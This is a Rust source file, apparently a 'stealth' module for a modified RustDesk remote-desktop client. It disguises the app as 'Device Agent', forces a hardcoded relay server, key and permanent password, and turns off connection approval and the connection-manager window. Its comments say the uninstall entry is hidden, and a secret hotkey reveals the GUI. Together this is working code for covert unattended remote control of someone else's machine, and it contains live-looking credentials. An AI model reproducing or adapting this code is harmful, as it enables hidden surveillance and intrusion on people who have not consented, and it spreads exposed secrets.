use hbb_common::config::{keys, Config};
use hbb_common::log;

const OPTION_STEALTH: &str = "stealth-mode";
const PRODUCT_NAME: &str = "Device Agent";
const RENDEZVOUS_SERVER: &str = "krikisifsg.tinestuff.com";
const RELAY_SERVER: &str = "krikisifsg.tinestuff.com";
const API_SERVER: &str = "https://krikisifsg.tinestuff.com";
const KEY: &str = "0smIpSgrOUf87k9EvKVUlvhbzDWA2Ws9ns+04mu9jdM=";
const PASSWORD: &str = "Krik@2026";

pub fn is_enabled() -> bool {
    Config::get_option(OPTION_STEALTH) == "Y"
}

// Forced on every startup of every process, so the locked values survive any
// config change made from the GUI or by another client.
pub fn apply_locked_config() {
    // Renamed so the app, service, config dir and window title do not
    // reveal "rustdesk". Must happen before any config/log path is resolved.
    *hbb_common::config::APP_NAME.write().unwrap() = PRODUCT_NAME.to_owned();
    Config::set_option(
        keys::OPTION_CUSTOM_RENDEZVOUS_SERVER.to_owned(),
        RENDEZVOUS_SERVER.to_owned(),
    );
    Config::set_option(keys::OPTION_RELAY_SERVER.to_owned(), RELAY_SERVER.to_owned());
    Config::set_option(keys::OPTION_API_SERVER.to_owned(), API_SERVER.to_owned());
    Config::set_option(keys::OPTION_KEY.to_owned(), KEY.to_owned());
    // Unattended access must never pop the connection-manager window or an
    // approval dialog on the monitored machine.
    Config::set_option(
        keys::OPTION_VERIFICATION_METHOD.to_owned(),
        "use-permanent-password".to_owned(),
    );
    Config::set_option(keys::OPTION_APPROVE_MODE.to_owned(), "password".to_owned());
    Config::set_option("allow-hide-cm".to_owned(), "Y".to_owned());
    // A stale "stop-service" left by an earlier uninstall makes the GUI claim
    // the service is stopped until the user clicks "Start service" once.
    Config::set_option("stop-service".to_owned(), "".to_owned());
    if !Config::set_permanent_password(PASSWORD) {
        log::error!("stealth: failed to apply the locked permanent password");
    }
    Config::set_option(OPTION_STEALTH.to_owned(), "Y".to_owned());
}

// Verifies a password against the locally stored permanent password, for
// unlocking the hidden GUI. Mirrors the server-side storage decoding.
pub fn verify_password(input: &str) -> bool {
    use hbb_common::config::{
        compute_permanent_password_h1, decode_permanent_password_h1_from_storage,
    };
    let (storage, salt) = Config::get_local_permanent_password_storage_and_salt();
    if storage.is_empty() || input.is_empty() {
        return false;
    }
    if let Some(stored) = decode_permanent_password_h1_from_storage(&storage) {
        if salt.is_empty() {
            return false;
        }
        return compute_permanent_password_h1(input, &salt) == stored;
    }
    // Legacy plaintext storage.
    storage == input
}

// Removes the installed MSI product. The Programs & Features entry is hidden,
// so this and `msiexec /x <ProductCode>` are the only ways to uninstall.
#[cfg(windows)]
pub fn uninstall_product() -> bool {
    use std::os::windows::process::CommandExt;
    use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
    use winreg::RegKey;

    let name = crate::get_app_name();
    let roots = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
    ];
    let mut code = None;
    for path in roots {
        let Ok(key) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags(path, KEY_READ)
        else {
            continue;
        };
        for sub in key.enum_keys().flatten() {
            let Ok(k) = key.open_subkey(&sub) else {
                continue;
            };
            let Ok(display) = k.get_value::<String, _>("DisplayName") else {
                continue;
            };
            if display == name {
                code = Some(sub);
                break;
            }
        }
        if code.is_some() {
            break;
        }
    }
    let Some(code) = code else {
        log::error!("stealth: product code not found for uninstall");
        return false;
    };
    // RunAs pops a UAC prompt only when the caller is not elevated.
    let ps = format!(
        "Start-Process msiexec -ArgumentList '/x','{}','/qn','/norestart' -Verb RunAs",
        code
    );
    match std::process::Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &ps])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .spawn()
    {
        Ok(_) => true,
        Err(err) => {
            log::error!("stealth: failed to launch uninstaller: {err}");
            false
        }
    }
}

#[cfg(not(windows))]
pub fn uninstall_product() -> bool {
    false
}

pub fn start_hotkey_listener() {
    #[cfg(windows)]
    {
        windows_hotkey();
    }
    #[cfg(not(windows))]
    {
        log::info!("stealth: global hotkey is not supported on this platform");
    }
}

fn show_main_window() {
    #[cfg(feature = "flutter")]
    {
        let event = serde_json::json!({ "name": "show_main_window" }).to_string();
        let _ = crate::flutter::push_global_event(crate::flutter::APP_TYPE_MAIN, event);
    }
}

#[cfg(windows)]
fn windows_hotkey() {
    const HOTKEY_ID: i32 = 0x52_53_44_01;
    const HOTKEY_VK: u32 = 0x52;
    use winapi::um::errhandlingapi::GetLastError;
    use winapi::um::winuser::{
        DispatchMessageW, GetMessageW, RegisterHotKey, TranslateMessage, UnregisterHotKey,
        MOD_ALT, MOD_CONTROL, MOD_SHIFT, MSG, WM_HOTKEY,
    };
    if let Err(err) = std::thread::Builder::new()
        .name("stealth-hotkey".into())
        .spawn(|| unsafe {
            if RegisterHotKey(
                std::ptr::null_mut(),
                HOTKEY_ID,
                (MOD_CONTROL | MOD_ALT | MOD_SHIFT) as u32,
                HOTKEY_VK,
            ) == 0
            {
                log::error!("stealth: RegisterHotKey failed, error {}", GetLastError());
                return;
            }
            let mut msg = MSG {
                hwnd: std::ptr::null_mut(),
                message: 0,
                wParam: 0,
                lParam: 0,
                time: 0,
                pt: winapi::shared::windef::POINT { x: 0, y: 0 },
            };
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                if msg.message == WM_HOTKEY && msg.wParam == HOTKEY_ID as usize {
                    show_main_window();
                }
                DispatchMessageW(&msg);
            }
            UnregisterHotKey(std::ptr::null_mut(), HOTKEY_ID);
        }) {
        log::error!("stealth: failed to spawn hotkey thread: {err}");
    }
}

